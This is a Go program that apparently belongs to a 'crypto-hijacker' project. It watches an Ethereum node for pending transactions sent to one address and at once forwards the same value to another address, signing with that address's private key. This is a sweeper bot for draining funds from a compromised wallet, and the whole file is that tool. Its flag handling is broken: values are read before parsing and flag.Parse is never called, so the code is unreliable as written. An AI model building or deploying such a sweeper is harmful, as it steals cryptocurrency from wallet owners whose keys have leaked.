package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"

	"github.com/maxoov1/crypto-hijacker/pkg/client"
)

var (
	endpoint string

	sender              common.Address
	senderPrivateKeyHex string

	recipient common.Address
)

func init() {
	endpoint = *flag.String("endpoint", "", "")

	sender = common.HexToAddress(*flag.String("sender", "", ""))
	senderPrivateKeyHex = *flag.String("senderPrivateKeyHex", "", "")

	recipient = common.HexToAddress(*flag.String("recipient", "", ""))
}

// validateTransaction checks if transaction can be hijacket
func validateTransaction(transaction *types.Transaction, isPending bool) error {
	if transaction == nil || transaction.To() == nil {
		return fmt.Errorf("provided nil transaction or it doesn't have address (?)")
	}

	if *transaction.To() != sender {
		return fmt.Errorf("ignoring transaction that not belong to sender account")
	}

	return nil
}

func pendingTransactionHandler(ctx context.Context, client *client.Client, hashes <-chan common.Hash) error {
	senderPrivateKey, err := crypto.HexToECDSA(senderPrivateKeyHex)
	if err != nil {
		return err
	}

	log.Printf("handler started; waiting for transactions...")

	for hash := range hashes {
		transaction, isPending, err := client.TransactionByHash(ctx, hash)
		if err != nil {
			log.Printf("failed to get transaction by hash: %s", err)
			continue
		}

		if err := validateTransaction(transaction, isPending); err != nil {
			continue
		}

		transaction, err = client.SendNewTransaction(
			ctx, sender, recipient, transaction.Value(), senderPrivateKey,
		)
		if err != nil {
			return fmt.Errorf("failed to hijack transaction: %w", err)
		}

		log.Printf("transaction hijacked: %x", transaction.Hash())
	}

	return nil
}

func main() {
	var ctx = context.Background()

	client, err := client.New(ctx, endpoint)
	if err != nil {
		log.Fatalf("failed to create new client: %s", err)
	}

	defer client.Close()

	subscription, hashes, err := client.SubscribeToPendingTransactions(ctx)
	if err != nil {
		log.Fatalf("failed to subscribe: %s", err)
	}

	exit := make(chan os.Signal, 1)
	signal.Notify(exit, os.Interrupt)

	go func() {
		if err := pendingTransactionHandler(ctx, client, hashes); err != nil {
			log.Fatalf("failed to handle transaction: %s", err)
		}
	}()

	<-exit

	subscription.Unsubscribe()
}
